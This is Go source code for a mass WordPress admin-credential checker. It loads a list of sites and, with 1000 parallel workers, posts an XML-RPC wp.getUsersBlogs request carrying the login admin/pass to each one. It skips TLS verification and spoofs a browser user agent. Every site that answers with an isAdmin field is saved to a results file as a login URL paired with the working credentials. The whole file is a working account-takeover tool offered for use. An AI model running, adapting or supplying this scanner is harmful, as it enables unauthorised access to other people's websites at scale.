package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	concurrency = 1000
	timeout     = 7 * time.Second
	userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	xmlPayload  = `<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>admin</string></value>
    </param>
    <param>
      <value><string>pass</string></value>
    </param>
  </params>
</methodCall>`
	outputFile  = "results.txt"
)

func buildClient() *http.Client {
	dialer := &net.Dialer{
		Timeout:   4 * time.Second,
		KeepAlive: -1,
	}
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			DialContext:           dialer.DialContext,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: timeout,
			DisableKeepAlives:     true,
		},
	}
}

func normalize(site string) string {
	site = strings.TrimSpace(site)
	if site == "" {
		return ""
	}
	if !strings.HasPrefix(site, "http://") && !strings.HasPrefix(site, "https://") {
		site = "https://" + site
	}
	return strings.TrimRight(site, "/")
}

func stripScheme(site string) string {
	site = strings.TrimPrefix(site, "https://")
	site = strings.TrimPrefix(site, "http://")
	return strings.TrimRight(site, "/")
}

func check(client *http.Client, site string, out *os.File, mu *sync.Mutex) {
	url := site + "/wp/xmlrpc.php"

	req, err := http.NewRequest("POST", url, strings.NewReader(xmlPayload))
	if err != nil {
		fmt.Printf("[-] bad url  %s\n", site)
		return
	}
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "application/xml; charset=UTF-8")
	req.Header.Set("Accept", "*/*")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[-] dead     %s\n", site)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		fmt.Printf("[-] read err %s\n", site)
		return
	}

	if strings.Contains(string(body), "<name>isAdmin</name>") {
		result := "https://" + stripScheme(site) + "/wp/wp-login.php#admin@pass"
		fmt.Printf("[+] MATCH    %s\n", result)
		mu.Lock()
		fmt.Fprintln(out, result)
		mu.Unlock()
	} else {
		fmt.Printf("[-] no match %s\n", site)
	}
}

func main() {
	fmt.Print("Sites list file: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	inputPath := strings.TrimSpace(scanner.Text())

	f, err := os.Open(inputPath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		os.Exit(1)
	}
	defer f.Close()

	var sites []string
	s := bufio.NewScanner(f)
	for s.Scan() {
		if line := normalize(s.Text()); line != "" {
			sites = append(sites, line)
		}
	}
	fmt.Printf("Loaded %d sites — running %d workers\n\n", len(sites), concurrency)

	out, err := os.OpenFile(outputFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening output file:", err)
		os.Exit(1)
	}
	defer out.Close()

	client := buildClient()
	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup
	var mu sync.Mutex

	for _, site := range sites {
		wg.Add(1)
		sem <- struct{}{}
		go func(s string) {
			defer wg.Done()
			defer func() { <-sem }()
			check(client, s, out, &mu)
		}(site)
	}

	wg.Wait()
	fmt.Printf("\nDone. Matches saved to %s\n", outputFile)
}